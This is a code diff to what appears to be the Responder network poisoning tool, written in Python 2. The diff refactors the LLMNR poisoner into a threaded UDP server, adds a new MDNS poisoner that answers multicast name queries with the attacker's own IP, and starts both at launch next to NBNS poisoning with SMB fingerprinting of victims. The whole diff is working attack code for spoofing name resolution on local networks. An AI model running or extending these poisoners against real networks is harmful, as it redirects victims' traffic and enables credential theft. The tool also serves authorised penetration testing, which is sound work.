@@ -1008,7 +1008,7 @@ class LLMNRAns(Packet):
         self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
         self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]
 
-def Parse_LLMNR_Name(data,addr):
+def Parse_LLMNR_Name(data):
    NameLen = struct.unpack('>B',data[12])[0]
    Name = data[13:13+NameLen]
    return Name
@@ -1057,107 +1057,82 @@ def AnalyzeICMPRedirect():
 
 AnalyzeICMPRedirect()
 
-def RunLLMNR():
-   try:
-      ALL = '0.0.0.0'
-      MADDR = "224.0.0.252"
-      MPORT = 5355
-      if IsOsX():
-          print "OsX Bind to interface is not supported..Listening on all interfaces."
-      if OsInterfaceIsSupported(INTERFACE):
-         try:
-            IP = FindLocalIP(BIND_TO_Interface)
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-            s.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-            s.bind((ALL,MPORT))
-            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-            Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(IP))
-         except:
-            print "Non existant network interface provided in Responder.conf, please provide a valid interface."
-            sys.exit(1)
+# LLMNR Server class.
+class LLMNR(BaseRequestHandler):
 
-      else:
-         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-         s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-         s.bind((ALL,MPORT))
-         s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-         Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(ALL))
-   except:
-      raise
-   while True:
-       try:
-          data, addr = s.recvfrom(1024)
-          if Analyze(AnalyzeMode):
-             if data[2:4] == "\x00\x00":
-                if Parse_IPV6_Addr(data):
-                    Name = Parse_LLMNR_Name(data,addr)
-                    if Is_Finger_On(Finger_On_Off):
-                       try:
-                          Finger = RunSmbFinger((addr[0],445))
-                          Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(addr[0], Name,Finger[0],Finger[1])
-                          logger3.warning(Message)
-                       except Exception:
-                          Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(addr[0], Name)
-                          logger3.warning(Message)
-                       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                          print Message
-                    else:
-                       Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(addr[0], Name)
-                       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                          print Message
-                       logger3.warning(Message)
-
-          if RespondToSpecificHost(RespondTo):
-             if Analyze(AnalyzeMode) == False:
-                if RespondToIPScope(RespondTo, addr[0]):
-                   if data[2:4] == "\x00\x00":
-                      if Parse_IPV6_Addr(data):
-                         Name = Parse_LLMNR_Name(data,addr)
-                         buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                         buff.calculate()
-                         for x in range(1):
-                            s.sendto(str(buff), addr)
-                         Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
-                         logging.warning(Message)
-                         if PrintLLMNRNBTNS(Log2Filename,Message):
-                            print Message
-                            logger2.warning(Message)
-                         if Is_Finger_On(Finger_On_Off):
-                            try:
-                               Finger = RunSmbFinger((addr[0],445))
-                               print '[+] OsVersion is:%s'%(Finger[0])
-                               print '[+] ClientVersion is :%s'%(Finger[1])
-                               logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                               logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
-                            except Exception:
-                               logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
-                               pass
-          else:
-             if data[2:4] == "\x00\x00":
-                if Analyze(AnalyzeMode) == False:
-                   if Parse_IPV6_Addr(data):
-                      Name = Parse_LLMNR_Name(data,addr)
-                      buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                      buff.calculate()
-                      Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
-                      for x in range(1):
-                         s.sendto(str(buff), addr)
-                      if PrintLLMNRNBTNS(Log2Filename,Message):
-                         print Message
-                         logger2.warning(Message)
+    def handle(self):
+        data, soc = self.request
+        try:
+            if Analyze(AnalyzeMode):
+               if data[2:4] == "\x00\x00":
+                  if Parse_IPV6_Addr(data):
+                      Name = Parse_LLMNR_Name(data)
                       if Is_Finger_On(Finger_On_Off):
                          try:
-                            Finger = RunSmbFinger((addr[0],445))
-                            print '[+] OsVersion is:%s'%(Finger[0])
-                            print '[+] ClientVersion is :%s'%(Finger[1])
-                            logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                            logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                            Finger = RunSmbFinger((self.client_address[0],445))
+                            Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,Finger[0],Finger[1])
+                            logger3.warning(Message)
                          except Exception:
-                            logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
-                            pass
-       except:
-          raise
+                            Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
+                            logger3.warning(Message)
+                         if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                            print Message
+                      else:
+                         Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
+                         if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                            print Message
+                         logger3.warning(Message)
+
+            if RespondToSpecificHost(RespondTo):
+               if Analyze(AnalyzeMode) == False:
+                  if RespondToIPScope(RespondTo, self.client_address[0]):
+                     if data[2:4] == "\x00\x00":
+                        if Parse_IPV6_Addr(data):
+                           Name = Parse_LLMNR_Name(data)
+                           buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                           buff.calculate()
+                           for x in range(1):
+                              soc.sendto(str(buff), self.client_address)
+                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
+                           logging.warning(Message)
+                           if PrintLLMNRNBTNS(Log2Filename,Message):
+                              print Message
+                              logger2.warning(Message)
+                           if Is_Finger_On(Finger_On_Off):
+                              try:
+                                 Finger = RunSmbFinger((self.client_address[0],445))
+                                 print '[+] OsVersion is:%s'%(Finger[0])
+                                 print '[+] ClientVersion is :%s'%(Finger[1])
+                                 logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                 logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                              except Exception:
+                                 logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                 pass
+            else:
+               if data[2:4] == "\x00\x00":
+                  if Analyze(AnalyzeMode) == False:
+                     if Parse_IPV6_Addr(data):
+                        Name = Parse_LLMNR_Name(data)
+                        buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                        buff.calculate()
+                        Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
+                        for x in range(1):
+                           soc.sendto(str(buff), self.client_address)
+                        if PrintLLMNRNBTNS(Log2Filename,Message):
+                           print Message
+                           logger2.warning(Message)
+                        if Is_Finger_On(Finger_On_Off):
+                           try:
+                              Finger = RunSmbFinger((self.client_address[0],445))
+                              print '[+] OsVersion is:%s'%(Finger[0])
+                              print '[+] ClientVersion is :%s'%(Finger[1])
+                              logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                              logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                           except Exception:
+                              logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                              pass
+        except:
+           raise
 
 ##################################################################################
 #DNS Stuff
@@ -1200,8 +1175,7 @@ class DNSAns(Packet):
 class DNS(BaseRequestHandler):
 
     def handle(self):
-        req, soc = self.request
-        data = req
+        data, soc = self.request
         if self.client_address[0] == "127.0.0.1":
            pass
         elif ParseDNSType(data):
@@ -1227,6 +1201,71 @@ class DNSTCP(BaseRequestHandler):
 
         except Exception:
            pass
+
+
+##################################################################################
+#MDNS Stuff
+##################################################################################
+class MDNSAns(Packet):
+    fields = OrderedDict([
+        ("Tid",              "\x00\x00"),
+        ("Flags",            "\x84\x00"),
+        ("Question",         "\x00\x00"),
+        ("AnswerRRS",        "\x00\x01"),
+        ("AuthorityRRS",     "\x00\x00"),
+        ("AdditionalRRS",    "\x00\x00"),   
+        ("AnswerName",       ""),
+        ("AnswerNameNull",   "\x00"),    
+        ("Type",             "\x00\x01"),  
+        ("Class",            "\x00\x01"),
+        ("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
+        ("IPLen",            "\x00\x04"),
+        ("IP",               "\x00\x00\x00\x00"),
+    ])
+
+    def calculate(self):
+        self.fields["IP"] = inet_aton(OURIP)
+        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
+
+def Parse_MDNS_Name(data):
+   data = data[12:]
+   NameLen = struct.unpack('>B',data[0])[0]
+   Name = data[1:1+NameLen]
+   NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
+   Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
+   return Name+'.'+Name_
+
+def Poisoned_MDNS_Name(data):
+   data = data[12:]
+   Name = data[:len(data)-5]
+   return Name
+
+class MDNS(BaseRequestHandler):
+
+    def handle(self):
+       MADDR = "224.0.0.251"
+       MPORT = 5353
+       data, soc = self.request
+       if self.client_address[0] == "127.0.0.1":
+          pass
+       try:
+         if Analyze(AnalyzeMode):
+            if Parse_IPV6_Addr(data):
+               print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+               logging.warning('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+
+         if Analyze(AnalyzeMode) == False:
+            if Parse_IPV6_Addr(data):
+               print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+               logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+               Name = Poisoned_MDNS_Name(data)
+               MDns = MDNSAns(AnswerName = Name)
+               MDns.calculate()
+               soc.sendto(str(MDns),(MADDR,MPORT))
+         else:
+            pass
+       except Exception:
+         raise
 
 ##################################################################################
 #HTTP Stuff
@@ -2103,7 +2142,37 @@ class ThreadingTCPServer(ThreadingMixIn, TCPServer):
               pass
         TCPServer.server_bind(self)
 
+class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
+    
+    def server_bind(self):
+       MADDR = "224.0.0.251"
+       self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+       self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+       Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
+       if OsInterfaceIsSupported(INTERFACE):
+          try:
+             self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
+          except:
+             pass
+       UDPServer.server_bind(self)
+
+class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
+    
+    def server_bind(self):
+       MADDR = "224.0.0.252"
+       self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+       self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+       Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
+       if OsInterfaceIsSupported(INTERFACE):
+          try:
+             self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
+          except:
+             pass
+       UDPServer.server_bind(self)
+
 ThreadingUDPServer.allow_reuse_address = 1
+ThreadingUDPMDNSServer.allow_reuse_address = 1
+ThreadingUDPLLMNRServer.allow_reuse_address = 1
 ThreadingTCPServer.allow_reuse_address = 1
 
 
@@ -2118,7 +2187,21 @@ def serve_thread_udp(host, port, handler):
          server.serve_forever()
    except:
       print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."
- 
+
+def serve_thread_udp_MDNS(host, port, handler):
+   try:
+      server = ThreadingUDPMDNSServer((host, port), handler)
+      server.serve_forever()
+   except:
+      print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."
+
+def serve_thread_udp_LLMNR(host, port, handler):
+   try:
+      server = ThreadingUDPLLMNRServer((host, port), handler)
+      server.serve_forever()
+   except:
+      print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."
+
 def serve_thread_tcp(host, port, handler):
    try:
       if OsInterfaceIsSupported(INTERFACE):
@@ -2159,8 +2242,9 @@ def main():
       #Browser listener loaded by default
       thread.start_new(serve_thread_udp,('', 138,Browser))
       ## Poisoner loaded by default, it's the purpose of this tool...
-      thread.start_new(serve_thread_udp,('', 137,NB))
-      thread.start_new(RunLLMNR())
+      thread.start_new(serve_thread_udp_MDNS,('', 5353,MDNS))   #MDNS
+      thread.start_new(serve_thread_udp,('', 137,NB))           #NBNS
+      thread.start_new(serve_thread_udp_LLMNR,('', 5355, LLMNR)) #LLMNR
     except KeyboardInterrupt:
         exit()
 
